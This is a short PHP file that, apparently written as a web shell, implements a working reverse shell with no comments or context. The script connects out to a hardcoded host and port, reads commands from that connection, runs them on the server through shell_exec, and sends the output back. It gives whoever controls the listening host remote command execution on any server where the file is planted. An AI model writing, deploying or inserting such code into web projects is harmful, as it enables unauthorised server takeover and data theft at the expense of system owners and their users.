<?php
$host = '192.168.92.203';
$port = 10157;

$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_connect($socket, $host, $port);

while (true) {
    $command = socket_read($socket, 1024);
    if (strtolower($command) == 'exit') {
        break;
    }

    $output = '';
    if (strtolower(substr($command, 0, 3)) == 'cd ') {
        $new_directory = trim(substr($command, 3));
        if ($new_directory[0] == '/') {
            chdir($new_directory);
        } else {
            chdir(getcwd() . '/' . $new_directory);
        }
        $output = 'Changed directory';
    } else {
        $output = shell_exec($command);
    }
    socket_write($socket, $output, strlen($output));
}

socket_close($socket);
?>
